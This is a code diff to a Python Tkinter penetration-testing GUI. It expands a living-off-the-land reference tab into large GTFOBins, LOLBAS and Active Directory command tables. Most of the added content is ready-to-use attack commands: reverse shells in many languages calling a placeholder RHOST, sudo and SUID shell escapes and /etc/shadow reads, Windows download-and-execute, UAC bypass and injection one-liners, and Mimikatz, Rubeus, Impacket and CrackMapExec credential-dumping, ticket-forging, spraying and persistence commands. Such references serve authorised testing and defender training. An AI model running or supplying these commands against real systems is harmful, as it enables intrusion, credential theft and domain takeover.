@@ -3725,7 +3725,7 @@ Adjustable:  Yes (via Settings)
         """Create the LOLOL tab for Living Off The Land binaries reference."""
         frame = tk.Frame(self.tool_container, bg=self.bg_secondary)
         frame.columnconfigure(1, weight=1)
-        frame.rowconfigure(4, weight=1)
+        frame.rowconfigure(5, weight=1)
 
         # Header
         header = tk.Label(
@@ -3735,50 +3735,47 @@ Adjustable:  Yes (via Settings)
             fg=self.accent_cyan,
             bg=self.bg_secondary
         )
-        header.grid(row=0, column=0, columnspan=2, sticky=tk.EW, padx=10, pady=15)
+        header.grid(row=0, column=0, columnspan=2, sticky=tk.EW, padx=10, pady=10)
 
         desc = tk.Label(
             frame,
-            text="GTFOBins-style reference for Linux binaries",
+            text="GTFOBins (Linux) • LOLBAS (Windows) • LOLAD (Active Directory)",
             font=("Courier", 9),
             fg=self.text_color,
             bg=self.bg_secondary
         )
         desc.grid(row=1, column=0, columnspan=2, padx=10, pady=(0, 10))
 
-        # Binary selection
-        label = tk.Label(frame, text="Select Binary:", font=("Courier", 10),
+        # Category selection
+        label = tk.Label(frame, text="Category:", font=("Courier", 10),
                         fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
         label.grid(row=2, column=0, sticky=tk.W, padx=10, pady=5)
 
-        self.lolol_binaries = [
-            "awk", "base64", "bash", "busybox", "cat", "chmod", "cp", "curl",
-            "cut", "date", "dd", "diff", "dmesg", "docker", "ed", "env",
-            "expand", "expect", "find", "ftp", "gdb", "git", "grep", "head",
-            "ip", "jq", "less", "lua", "make", "more", "mv", "nano", "nc",
-            "nmap", "node", "perl", "php", "pip", "python", "python3",
-            "readelf", "rlwrap", "rsync", "ruby", "scp", "sed", "socat",
-            "ssh", "strace", "tail", "tar", "tee", "vim", "watch", "wget",
-            "xargs", "xxd", "zip"
-        ]
+        self.lolol_category = ttk.Combobox(frame, values=[
+            "🐧 GTFOBins (Linux)",
+            "🪟 LOLBAS (Windows)",
+            "🏢 LOLAD (Active Directory)"
+        ], font=("Courier", 10), state="readonly", width=28)
+        self.lolol_category.grid(row=2, column=1, sticky=tk.W, padx=10, pady=5)
+        self.lolol_category.current(0)
+        self.lolol_category.bind("<<ComboboxSelected>>", self.on_lolol_category_changed)
 
-        self.lolol_binary = ttk.Combobox(frame, values=self.lolol_binaries,
-                                         font=("Courier", 10), state="readonly", width=25)
-        self.lolol_binary.grid(row=2, column=1, sticky=tk.W, padx=10, pady=5)
-        self.lolol_binary.current(0)
+        # Binary/Technique selection
+        label = tk.Label(frame, text="Binary/Technique:", font=("Courier", 10),
+                        fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
+        label.grid(row=3, column=0, sticky=tk.W, padx=10, pady=5)
+
+        self.lolol_binary = ttk.Combobox(frame, font=("Courier", 10), state="readonly", width=28)
+        self.lolol_binary.grid(row=3, column=1, sticky=tk.W, padx=10, pady=5)
         self.lolol_binary.bind("<<ComboboxSelected>>", lambda e: self.show_lolol_info())
 
         # Function type
         label = tk.Label(frame, text="Function:", font=("Courier", 10),
                         fg=self.text_color, bg=self.bg_secondary, anchor=tk.W)
-        label.grid(row=3, column=0, sticky=tk.W, padx=10, pady=5)
+        label.grid(row=4, column=0, sticky=tk.W, padx=10, pady=5)
 
-        self.lolol_function = ttk.Combobox(frame, values=[
-            "Shell", "File read", "File write", "SUID", "Sudo",
-            "Reverse shell", "File upload", "File download"
-        ], font=("Courier", 10), state="readonly", width=25)
-        self.lolol_function.grid(row=3, column=1, sticky=tk.W, padx=10, pady=5)
-        self.lolol_function.current(0)
+        self.lolol_function = ttk.Combobox(frame, font=("Courier", 10), state="readonly", width=28)
+        self.lolol_function.grid(row=4, column=1, sticky=tk.W, padx=10, pady=5)
         self.lolol_function.bind("<<ComboboxSelected>>", lambda e: self.show_lolol_info())
 
         # Info display
@@ -3788,10 +3785,11 @@ Adjustable:  Yes (via Settings)
             insertbackground=self.accent_green,
             wrap=tk.WORD
         )
-        self.lolol_output.grid(row=4, column=0, columnspan=2, sticky=tk.NSEW, padx=10, pady=10)
+        self.lolol_output.grid(row=5, column=0, columnspan=2, sticky=tk.NSEW, padx=10, pady=10)
 
-        # Show initial info
-        self.show_lolol_info()
+        # Initialize category data
+        self.init_lolol_data()
+        self.on_lolol_category_changed(None)
 
         # Copy button
         copy_btn = tk.Button(
@@ -3808,16 +3806,14 @@ Adjustable:  Yes (via Settings)
             cursor="hand2",
             command=lambda: self.copy_to_clipboard(self.lolol_output.get("1.0", tk.END))
         )
-        copy_btn.grid(row=5, column=0, columnspan=2, pady=10)
+        copy_btn.grid(row=6, column=0, columnspan=2, pady=10)
 
         return frame
 
-    def show_lolol_info(self):
-        """Show LOLOL binary information based on selection."""
-        binary = self.lolol_binary.get()
-        function = self.lolol_function.get()
-
-        lolol_data = {
+    def init_lolol_data(self):
+        """Initialize all LOLOL data for GTFOBins, LOLBAS, and LOLAD."""
+        # GTFOBins data (Linux)
+        self.gtfobins_data = {
             "awk": {
                 "Shell": "awk 'BEGIN {system(\"/bin/sh\")}'",
                 "File read": "awk '//' /path/to/file",
@@ -3825,6 +3821,11 @@ Adjustable:  Yes (via Settings)
                 "SUID": "./awk 'BEGIN {system(\"/bin/sh\")}'",
                 "Sudo": "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
                 "Reverse shell": "awk 'BEGIN {s=\"/inet/tcp/0/RHOST/RPORT\";while(42){printf \">\" |& s;s |& getline c;if(c){while((c |& getline) > 0)print $0 |& s;close(c)}}}' /dev/null"
+            },
+            "base64": {
+                "File read": "base64 /path/to/file | base64 -d",
+                "SUID": "./base64 /etc/shadow | base64 -d",
+                "Sudo": "sudo base64 /etc/shadow | base64 -d"
             },
             "bash": {
                 "Shell": "/bin/bash",
@@ -3837,25 +3838,87 @@ Adjustable:  Yes (via Settings)
                 "SUID": "./cat /etc/shadow",
                 "Sudo": "sudo cat /etc/shadow"
             },
+            "chmod": {
+                "SUID": "./chmod 6777 /bin/bash",
+                "Sudo": "sudo chmod 6777 /bin/bash"
+            },
+            "cp": {
+                "File write": "cp /path/from /path/to",
+                "SUID": "./cp /bin/bash /tmp/bash; chmod +s /tmp/bash",
+                "Sudo": "sudo cp /bin/bash /tmp/bash; sudo chmod +s /tmp/bash"
+            },
             "curl": {
                 "File read": "curl file:///path/to/file",
                 "File upload": "curl -X POST -d @/path/to/file http://RHOST/",
                 "File download": "curl http://RHOST/file -o /path/to/output"
+            },
+            "docker": {
+                "Shell": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
+                "SUID": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
+                "Sudo": "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
+            },
+            "env": {
+                "Shell": "env /bin/sh",
+                "SUID": "./env /bin/sh -p",
+                "Sudo": "sudo env /bin/sh"
             },
             "find": {
                 "Shell": "find . -exec /bin/sh \\; -quit",
                 "SUID": "./find . -exec /bin/sh -p \\; -quit",
                 "Sudo": "sudo find . -exec /bin/sh \\; -quit"
             },
-            "nmap": {
-                "Shell": "nmap --interactive\\n!sh",
-                "SUID": "./nmap --interactive\\n!sh",
-                "Sudo": "sudo nmap --interactive\\n!sh"
+            "ftp": {
+                "Shell": "ftp\\n!/bin/sh",
+                "File download": "ftp -o /path/to/output http://RHOST/file"
+            },
+            "gdb": {
+                "Shell": "gdb -nx -ex '!sh' -ex quit",
+                "SUID": "./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit",
+                "Sudo": "sudo gdb -nx -ex '!sh' -ex quit"
+            },
+            "git": {
+                "Shell": "git help config\\n!/bin/sh",
+                "SUID": "./git help config\\n!/bin/sh",
+                "Sudo": "sudo git -p help config\\n!/bin/sh"
+            },
+            "less": {
+                "Shell": "less /etc/passwd\\n!/bin/sh",
+                "File read": "less /path/to/file",
+                "SUID": "./less /etc/passwd\\n!/bin/sh",
+                "Sudo": "sudo less /etc/passwd\\n!/bin/sh"
+            },
+            "lua": {
+                "Shell": "lua -e 'os.execute(\"/bin/sh\")'",
+                "Sudo": "sudo lua -e 'os.execute(\"/bin/sh\")'",
+                "Reverse shell": "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('RHOST','RPORT');os.execute('/bin/sh -i <&3 >&3 2>&3');\""
+            },
+            "man": {
+                "Shell": "man man\\n!/bin/sh",
+                "Sudo": "sudo man man\\n!/bin/sh"
+            },
+            "more": {
+                "Shell": "more /etc/passwd\\n!/bin/sh",
+                "SUID": "./more /etc/passwd\\n!/bin/sh",
+                "Sudo": "sudo more /etc/passwd\\n!/bin/sh"
+            },
+            "nano": {
+                "Shell": "nano\\n^R^X\\nreset; sh 1>&0 2>&0",
+                "Sudo": "sudo nano -s /bin/sh\\n/bin/sh\\n^T"
             },
             "nc": {
                 "Reverse shell": "nc -e /bin/sh RHOST RPORT",
                 "File upload": "nc -lvnp RPORT > file < /path/to/file",
                 "File download": "nc RHOST RPORT < /path/to/file"
+            },
+            "nmap": {
+                "Shell": "nmap --interactive\\n!sh",
+                "SUID": "./nmap --interactive\\n!sh",
+                "Sudo": "sudo nmap --interactive\\n!sh"
+            },
+            "node": {
+                "Shell": "node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'",
+                "Sudo": "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'",
+                "Reverse shell": "node -e '(function(){var net=require(\"net\"),cp=require(\"child_process\"),sh=cp.spawn(\"/bin/sh\",[]);var client=new net.Socket();client.connect(RPORT,\"RHOST\",function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();'"
             },
             "perl": {
                 "Shell": "perl -e 'exec \"/bin/sh\";'",
@@ -3867,6 +3930,10 @@ Adjustable:  Yes (via Settings)
                 "Shell": "php -r \"system('/bin/sh');\"",
                 "Sudo": "sudo php -r \"system('/bin/sh');\"",
                 "Reverse shell": "php -r '$sock=fsockopen(\"RHOST\",RPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+            },
+            "pip": {
+                "Shell": "TF=$(mktemp -d)\\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\\npip install $TF",
+                "Sudo": "TF=$(mktemp -d)\\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\\nsudo pip install $TF"
             },
             "python": {
                 "Shell": "python -c 'import os; os.system(\"/bin/sh\")'",
@@ -3880,29 +3947,377 @@ Adjustable:  Yes (via Settings)
                 "Sudo": "sudo python3 -c 'import os; os.system(\"/bin/sh\")'",
                 "Reverse shell": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"RHOST\",RPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
             },
+            "rsync": {
+                "Shell": "rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null",
+                "Sudo": "sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null"
+            },
             "ruby": {
                 "Shell": "ruby -e 'exec \"/bin/sh\"'",
                 "Sudo": "sudo ruby -e 'exec \"/bin/sh\"'",
                 "Reverse shell": "ruby -rsocket -e'f=TCPSocket.open(\"RHOST\",RPORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+            },
+            "scp": {
+                "File download": "scp user@RHOST:/path/to/file /local/path",
+                "File upload": "scp /local/file user@RHOST:/remote/path"
+            },
+            "sed": {
+                "File read": "sed '' /path/to/file",
+                "SUID": "./sed '' /etc/shadow",
+                "Sudo": "sudo sed '' /etc/shadow"
+            },
+            "socat": {
+                "Shell": "socat stdin exec:/bin/sh",
+                "Reverse shell": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:RHOST:RPORT",
+                "File download": "socat -u TCP:RHOST:RPORT OPEN:/path/to/output,creat"
+            },
+            "ssh": {
+                "Shell": "ssh -o ProxyCommand=';sh 0<&2 1>&2' x",
+                "Sudo": "sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x"
+            },
+            "strace": {
+                "SUID": "./strace -o /dev/null /bin/sh -p",
+                "Sudo": "sudo strace -o /dev/null /bin/sh"
+            },
+            "tar": {
+                "Shell": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
+                "SUID": "./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
+                "Sudo": "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"
+            },
+            "tee": {
+                "File write": "echo 'content' | tee /path/to/file",
+                "SUID": "echo 'content' | ./tee /path/to/file",
+                "Sudo": "echo 'content' | sudo tee /path/to/file"
             },
             "vim": {
                 "Shell": "vim -c ':!/bin/sh'",
                 "SUID": "./vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
                 "Sudo": "sudo vim -c ':!/bin/sh'"
             },
+            "watch": {
+                "Shell": "watch -x sh -c 'reset; exec sh 1>&0 2>&0'",
+                "Sudo": "sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'"
+            },
             "wget": {
                 "File download": "wget http://RHOST/file -O /path/to/output",
                 "File upload": "wget --post-file=/path/to/file http://RHOST/"
+            },
+            "xxd": {
+                "File read": "xxd /path/to/file | xxd -r",
+                "SUID": "./xxd /etc/shadow | xxd -r",
+                "Sudo": "sudo xxd /etc/shadow | xxd -r"
+            },
+            "zip": {
+                "Shell": "TF=$(mktemp -u)\\nzip $TF /etc/hosts -T -TT 'sh #'\\nrm $TF",
+                "Sudo": "TF=$(mktemp -u)\\nsudo zip $TF /etc/hosts -T -TT 'sh #'\\nsudo rm $TF"
             }
         }
 
-        # Get info for selected binary and function
-        binary_data = lolol_data.get(binary, {})
-        info = binary_data.get(function, f"No {function} technique available for {binary}")
+        # LOLBAS data (Windows)
+        self.lolbas_data = {
+            "certutil.exe": {
+                "Download": "certutil.exe -urlcache -split -f http://RHOST/file.exe output.exe",
+                "Encode": "certutil.exe -encode input.txt output.txt",
+                "Decode": "certutil.exe -decode input.txt output.exe",
+                "ADS": "certutil.exe -urlcache -split -f http://RHOST/file.exe C:\\Temp:file.exe"
+            },
+            "mshta.exe": {
+                "Execute": "mshta.exe http://RHOST/payload.hta",
+                "Inline": "mshta.exe vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"powershell -ep bypass -c IEX(cmd)\"\", 0:close\")",
+                "JavaScript": "mshta.exe \"javascript:a=new ActiveXObject('Wscript.Shell');a.Run('cmd /c calc');close();\""
+            },
+            "msiexec.exe": {
+                "Execute": "msiexec /q /i http://RHOST/payload.msi",
+                "DLL": "msiexec /y C:\\path\\to\\payload.dll"
+            },
+            "regsvr32.exe": {
+                "Execute": "regsvr32 /s /n /u /i:http://RHOST/payload.sct scrobj.dll",
+                "Local SCT": "regsvr32 /s /n /u /i:C:\\path\\payload.sct scrobj.dll"
+            },
+            "rundll32.exe": {
+                "Execute": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();h=new%20ActiveXObject(\"WScript.Shell\").Run(\"calc\")",
+                "DLL": "rundll32.exe C:\\path\\to\\payload.dll,EntryPoint",
+                "URL": "rundll32.exe url.dll,OpenURL http://RHOST/payload.hta"
+            },
+            "msbuild.exe": {
+                "Execute": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\msbuild.exe payload.xml",
+                "Inline": "msbuild.exe /p:Configuration=Release payload.csproj"
+            },
+            "installutil.exe": {
+                "Execute": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe"
+            },
+            "csc.exe": {
+                "Compile": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:payload.exe payload.cs"
+            },
+            "powershell.exe": {
+                "Download": "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://RHOST/payload.ps1')\"",
+                "Encoded": "powershell -EncodedCommand <base64>",
+                "Bypass": "powershell -ExecutionPolicy Bypass -File payload.ps1",
+                "Reverse shell": "powershell -NoP -NonI -W Hidden -Exec Bypass -c \"$client=New-Object System.Net.Sockets.TCPClient('RHOST',RPORT);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sb=(iex $data 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sb2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
+            },
+            "cmd.exe": {
+                "Execute": "cmd.exe /c <command>",
+                "Download": "cmd.exe /c certutil -urlcache -split -f http://RHOST/file.exe"
+            },
+            "wmic.exe": {
+                "Execute": "wmic process call create \"cmd.exe /c <command>\"",
+                "Remote": "wmic /node:TARGET process call create \"cmd.exe /c <command>\""
+            },
+            "cscript.exe": {
+                "Execute": "cscript.exe //E:jscript C:\\path\\payload.txt",
+                "VBS": "cscript.exe C:\\path\\payload.vbs"
+            },
+            "wscript.exe": {
+                "Execute": "wscript.exe C:\\path\\payload.vbs",
+                "JS": "wscript.exe C:\\path\\payload.js"
+            },
+            "bitsadmin.exe": {
+                "Download": "bitsadmin /transfer job /download /priority high http://RHOST/payload.exe C:\\Temp\\payload.exe",
+                "Execute": "bitsadmin /create 1 & bitsadmin /addfile 1 http://RHOST/payload.exe C:\\Temp\\payload.exe & bitsadmin /SETNOTIFYCMDLINE 1 C:\\Temp\\payload.exe NULL & bitsadmin /Resume 1"
+            },
+            "forfiles.exe": {
+                "Execute": "forfiles /p c:\\windows\\system32 /m notepad.exe /c \"cmd.exe /c calc.exe\""
+            },
+            "pcalua.exe": {
+                "Execute": "pcalua.exe -a calc.exe",
+                "DLL": "pcalua.exe -a C:\\path\\payload.dll"
+            },
+            "schtasks.exe": {
+                "Execute": "schtasks /create /tn \"TaskName\" /tr \"C:\\path\\payload.exe\" /sc once /st 00:00",
+                "Remote": "schtasks /create /s TARGET /tn \"TaskName\" /tr \"C:\\path\\payload.exe\" /sc once /st 00:00"
+            },
+            "at.exe": {
+                "Execute": "at 00:00 /interactive cmd.exe"
+            },
+            "reg.exe": {
+                "Persistence": "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Payload /t REG_SZ /d \"C:\\path\\payload.exe\"",
+                "Query": "reg query HKLM /s /f password"
+            },
+            "expand.exe": {
+                "Copy ADS": "expand \\\\RHOST\\share\\file.exe C:\\Temp:file.exe"
+            },
+            "esentutl.exe": {
+                "Copy ADS": "esentutl.exe /y \\\\RHOST\\share\\file.exe /d C:\\Temp\\file.exe /o"
+            },
+            "extrac32.exe": {
+                "Copy": "extrac32.exe /Y /C \\\\RHOST\\share\\file.cab C:\\Temp\\file.exe"
+            },
+            "findstr.exe": {
+                "Download": "findstr /V /L W3AllLov3DonaldTrump \\\\RHOST\\share\\file.exe > C:\\Temp\\file.exe"
+            },
+            "hh.exe": {
+                "Execute": "hh.exe http://RHOST/payload.chm"
+            },
+            "ieexec.exe": {
+                "Download": "ieexec.exe http://RHOST/payload.exe"
+            },
+            "makecab.exe": {
+                "Compress": "makecab C:\\path\\file.exe C:\\Temp\\file.cab"
+            },
+            "replace.exe": {
+                "Copy": "replace.exe \\\\RHOST\\share\\file.exe C:\\Temp /A"
+            },
+            "xwizard.exe": {
+                "Execute": "xwizard.exe RunWizard {CLSID}"
+            },
+            "dnscmd.exe": {
+                "DLL Load": "dnscmd.exe /config /serverlevelplugindll \\\\RHOST\\share\\payload.dll"
+            },
+            "fltMC.exe": {
+                "UAC Bypass": "fltMC.exe"
+            },
+            "mavinject.exe": {
+                "Inject": "mavinject.exe <PID> /INJECTRUNNING C:\\path\\payload.dll"
+            },
+            "syncappvpublishingserver.exe": {
+                "Execute": "SyncAppvPublishingServer.exe \"n; Start-Process calc\""
+            },
+            "control.exe": {
+                "DLL": "control.exe C:\\path\\payload.dll"
+            },
+            "cmstp.exe": {
+                "UAC Bypass": "cmstp.exe /s C:\\path\\payload.inf"
+            },
+            "bash.exe": {
+                "Execute": "bash.exe -c \"<command>\"",
+                "Reverse shell": "bash.exe -c \"bash -i >& /dev/tcp/RHOST/RPORT 0>&1\""
+            }
+        }
+
+        # LOLAD data (Active Directory)
+        self.lolad_data = {
+            "BloodHound/SharpHound": {
+                "Collect All": "SharpHound.exe -c All",
+                "Collect DCOnly": "SharpHound.exe -c DCOnly",
+                "Stealth": "SharpHound.exe -c All --Stealth",
+                "Loop": "SharpHound.exe -c Session --Loop"
+            },
+            "PowerView": {
+                "Domain Info": "Get-NetDomain",
+                "Domain Controllers": "Get-NetDomainController",
+                "Domain Users": "Get-NetUser",
+                "Domain Groups": "Get-NetGroup",
+                "Domain Computers": "Get-NetComputer",
+                "Group Members": "Get-NetGroupMember -GroupName \"Domain Admins\"",
+                "Local Admins": "Find-LocalAdminAccess",
+                "User Sessions": "Get-NetSession -ComputerName <target>",
+                "ACL Abuse": "Find-InterestingDomainAcl"
+            },
+            "Mimikatz": {
+                "Dump Hashes": "sekurlsa::logonpasswords",
+                "DCSync": "lsadump::dcsync /domain:DOMAIN /user:Administrator",
+                "Golden Ticket": "kerberos::golden /user:Administrator /domain:DOMAIN /sid:S-1-5-21-XXX /krbtgt:HASH /ptt",
+                "Silver Ticket": "kerberos::golden /user:Administrator /domain:DOMAIN /sid:S-1-5-21-XXX /target:TARGET /service:SERVICE /rc4:HASH /ptt",
+                "Pass-the-Hash": "sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:HASH",
+                "Pass-the-Ticket": "kerberos::ptt ticket.kirbi",
+                "Skeleton Key": "misc::skeleton"
+            },
+            "Rubeus": {
+                "Kerberoast": "Rubeus.exe kerberoast /outfile:hashes.txt",
+                "AS-REP Roast": "Rubeus.exe asreproast /outfile:hashes.txt",
+                "Request TGT": "Rubeus.exe asktgt /user:USER /password:PASS /domain:DOMAIN",
+                "Request TGS": "Rubeus.exe asktgs /ticket:TGT /service:SERVICE/TARGET",
+                "Pass-the-Ticket": "Rubeus.exe ptt /ticket:ticket.kirbi",
+                "S4U": "Rubeus.exe s4u /user:USER /rc4:HASH /impersonateuser:TARGET /msdsspn:SERVICE/TARGET",
+                "Dump Tickets": "Rubeus.exe dump"
+            },
+            "Impacket": {
+                "Secretsdump": "secretsdump.py DOMAIN/USER:PASS@TARGET",
+                "DCSync": "secretsdump.py -just-dc DOMAIN/USER:PASS@DC",
+                "PSExec": "psexec.py DOMAIN/USER:PASS@TARGET",
+                "WMIExec": "wmiexec.py DOMAIN/USER:PASS@TARGET",
+                "SMBExec": "smbexec.py DOMAIN/USER:PASS@TARGET",
+                "ATExec": "atexec.py DOMAIN/USER:PASS@TARGET",
+                "GetUserSPNs": "GetUserSPNs.py -request DOMAIN/USER:PASS",
+                "GetNPUsers": "GetNPUsers.py DOMAIN/ -usersfile users.txt -format hashcat"
+            },
+            "CrackMapExec": {
+                "SMB Enum": "crackmapexec smb TARGET -u USER -p PASS",
+                "Pass-the-Hash": "crackmapexec smb TARGET -u USER -H HASH",
+                "Dump SAM": "crackmapexec smb TARGET -u USER -p PASS --sam",
+                "Dump LSA": "crackmapexec smb TARGET -u USER -p PASS --lsa",
+                "Dump NTDS": "crackmapexec smb DC -u USER -p PASS --ntds",
+                "Execute": "crackmapexec smb TARGET -u USER -p PASS -x \"command\"",
+                "Spray": "crackmapexec smb TARGET -u users.txt -p PASS --continue-on-success"
+            },
+            "Lateral Movement": {
+                "PsExec": "PsExec.exe \\\\TARGET -u DOMAIN\\USER -p PASS cmd.exe",
+                "WinRM": "Enter-PSSession -ComputerName TARGET -Credential DOMAIN\\USER",
+                "WMI": "wmic /node:TARGET process call create \"cmd.exe /c <command>\"",
+                "DCOM": "Invoke-DCOM -ComputerName TARGET -Method MMC20.Application -Command \"cmd.exe /c <command>\"",
+                "SCM": "sc \\\\TARGET create ServiceName binPath= \"cmd.exe /c <command>\"",
+                "Remote Registry": "reg add \\\\TARGET\\HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Payload /t REG_SZ /d \"C:\\path\\payload.exe\"",
+                "RDP": "mstsc /v:TARGET"
+            },
+            "Persistence": {
+                "Golden Ticket": "kerberos::golden /user:Administrator /domain:DOMAIN /sid:S-1-5-21-XXX /krbtgt:HASH /ptt",
+                "Silver Ticket": "kerberos::golden /user:USER /domain:DOMAIN /sid:S-1-5-21-XXX /target:TARGET /service:cifs /rc4:HASH",
+                "Skeleton Key": "misc::skeleton (on DC - password: mimikatz)",
+                "DCSync Rights": "Add-ObjectACL -TargetDistinguishedName 'DC=domain,DC=local' -PrincipalSamAccountName USER -Rights DCSync",
+                "AdminSDHolder": "Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName USER -Rights All",
+                "DSRM": "Set-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name DsrmAdminLogonBehavior -Value 2",
+                "SID History": "Add-SIDHistory -TargetUser USER -SourceSID S-1-5-21-XXX-500",
+                "Custom SSP": "misc::memssp (injects SSP for credential logging)"
+            },
+            "Privilege Escalation": {
+                "DCSync": "lsadump::dcsync /domain:DOMAIN /user:krbtgt",
+                "Unconstrained Delegation": "Get-NetComputer -Unconstrained",
+                "Constrained Delegation": "Get-DomainUser -TrustedToAuth",
+                "Resource-Based CD": "Set-ADComputer TARGET -PrincipalsAllowedToDelegateToAccount COMPUTER$",
+                "LAPS": "Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd",
+                "GPP Passwords": "Get-GPPPassword",
+                "ASREPRoast": "Get-DomainUser -PreauthNotRequired",
+                "Kerberoast": "Get-DomainUser -SPN"
+            },
+            "Reconnaissance": {
+                "Domain Info": "Get-ADDomain",
+                "Forest Info": "Get-ADForest",
+                "Trust Relationships": "Get-ADTrust -Filter *",
+                "Password Policy": "Get-ADDefaultDomainPasswordPolicy",
+                "Fine-Grained Policy": "Get-ADFineGrainedPasswordPolicy -Filter *",
+                "OUs": "Get-ADOrganizationalUnit -Filter *",
+                "GPOs": "Get-GPO -All",
+                "Service Accounts": "Get-ADServiceAccount -Filter *",
+                "ADCS Templates": "certutil -TCAInfo"
+            },
+            "ADCS Attacks": {
+                "Find Templates": "Certify.exe find /vulnerable",
+                "ESC1": "Certify.exe request /ca:CA /template:Template /altname:Administrator",
+                "ESC4": "Certify.exe request /ca:CA /template:Template (after modifying template)",
+                "ESC8": "Coercer.py + ntlmrelayx.py to ADCS HTTP endpoint",
+                "Request Cert": "Certify.exe request /ca:CA /template:Template",
+                "Dump PFX": "Certify.exe download /ca:CA /id:ID"
+            },
+            "Coercion Attacks": {
+                "PetitPotam": "PetitPotam.py LISTENER TARGET",
+                "PrinterBug": "SpoolSample.exe TARGET LISTENER",
+                "DFSCoerce": "dfscoerce.py -d DOMAIN -u USER -p PASS LISTENER TARGET",
+                "ShadowCoerce": "ShadowCoerce.py LISTENER TARGET"
+            }
+        }
+
+        self.lolol_categories = {
+            "🐧 GTFOBins (Linux)": {
+                "binaries": sorted(self.gtfobins_data.keys()),
+                "functions": ["Shell", "File read", "File write", "SUID", "Sudo", "Reverse shell", "File upload", "File download"],
+                "data": self.gtfobins_data
+            },
+            "🪟 LOLBAS (Windows)": {
+                "binaries": sorted(self.lolbas_data.keys()),
+                "functions": ["Download", "Execute", "Encode", "Decode", "DLL", "ADS", "Inline", "Persistence", "Reverse shell", "UAC Bypass", "Copy", "Inject"],
+                "data": self.lolbas_data
+            },
+            "🏢 LOLAD (Active Directory)": {
+                "binaries": list(self.lolad_data.keys()),
+                "functions": list(set(func for techniques in self.lolad_data.values() for func in techniques.keys())),
+                "data": self.lolad_data
+            }
+        }
+
+    def on_lolol_category_changed(self, event):
+        """Handle category change in LOLOL tab."""
+        category = self.lolol_category.get()
+        if category in self.lolol_categories:
+            cat_data = self.lolol_categories[category]
+            # Update binary list
+            self.lolol_binary['values'] = cat_data['binaries']
+            if cat_data['binaries']:
+                self.lolol_binary.current(0)
+            # Update function list
+            self.lolol_function['values'] = cat_data['functions']
+            if cat_data['functions']:
+                self.lolol_function.current(0)
+            # Show info
+            self.show_lolol_info()
+
+    def show_lolol_info(self):
+        """Show LOLOL binary information based on selection."""
+        category = self.lolol_category.get()
+        binary = self.lolol_binary.get()
+        function = self.lolol_function.get()
+
+        if not category or not binary:
+            return
+
+        cat_data = self.lolol_categories.get(category, {})
+        data = cat_data.get('data', {})
+        binary_data = data.get(binary, {})
 
         self.lolol_output.delete("1.0", tk.END)
-        self.lolol_output.insert("1.0", f"Binary: {binary}\nFunction: {function}\n\n{info}\n\n")
-        self.lolol_output.insert(tk.END, "Replace RHOST and RPORT with your target values.")
+
+        if function in binary_data:
+            info = binary_data[function]
+            self.lolol_output.insert("1.0", f"Category: {category}\nBinary: {binary}\nFunction: {function}\n\n")
+            self.lolol_output.insert(tk.END, f"{'═' * 50}\n\n")
+            self.lolol_output.insert(tk.END, f"{info}\n\n")
+            self.lolol_output.insert(tk.END, f"{'═' * 50}\n\n")
+            self.lolol_output.insert(tk.END, "Replace RHOST/RPORT/TARGET/DOMAIN/USER/PASS with your values.")
+        else:
+            # Show all available functions for this binary
+            self.lolol_output.insert("1.0", f"Category: {category}\nBinary: {binary}\n\n")
+            self.lolol_output.insert(tk.END, f"{'═' * 50}\n")
